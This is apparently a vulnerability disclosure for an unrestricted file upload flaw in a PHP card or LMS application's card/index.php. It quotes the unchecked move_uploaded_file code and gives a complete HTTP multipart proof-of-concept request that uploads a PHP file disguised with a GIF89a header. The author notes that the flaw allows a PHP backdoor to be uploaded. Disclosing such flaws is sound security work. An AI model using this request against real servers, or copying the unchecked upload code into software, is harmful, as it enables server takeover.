### Vulnerability file address

`card/index.php` from line 97

There is no restriction on the type of uploaded files, any file can be uploaded, and the default upload path is `card/assets/uploads/`

```php
......
......
......
else{


          // image upload 
          $uploaddir = 'assets/uploads/';
          $uploadfile = $uploaddir . basename($_FILES['image']['name']);

      
          if (move_uploaded_file($_FILES['image']['tmp_name'], $uploadfile)) {
              
          } else {
              echo "Possible file upload attack!\n";
          }
......
......
......
```

So we can upload the php backdoor file

### POC

```http
POST /card/ HTTP/1.1
Host: www.lms.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------111058958834369528633834510475
Content-Length: 1158
Origin: http://www.lms.net
Connection: close
Referer: http://www.lms.net/card/
Upgrade-Insecure-Requests: 1

-----------------------------111058958834369528633834510475
Content-Disposition: form-data; name="name"

12
-----------------------------111058958834369528633834510475
Content-Disposition: form-data; name="grade"

Education
-----------------------------111058958834369528633834510475
Content-Disposition: form-data; name="dob"

Student
-----------------------------111058958834369528633834510475
Content-Disposition: form-data; name="address"

12
-----------------------------111058958834369528633834510475
Content-Disposition: form-data; name="email"

12
-----------------------------111058958834369528633834510475
Content-Disposition: form-data; name="exp_date"

12
-----------------------------111058958834369528633834510475
Content-Disposition: form-data; name="id_no"

12
-----------------------------111058958834369528633834510475
Content-Disposition: form-data; name="phone"

12
-----------------------------111058958834369528633834510475
Content-Disposition: form-data; name="image"; filename="2.php"
Content-Type: text/php

GIF89a<?php phpinfo();?>
-----------------------------111058958834369528633834510475--
```

### Attack results pictures

![image-20220630214422189](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220630214422.png)



![image-20220630214605238](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220630214605.png)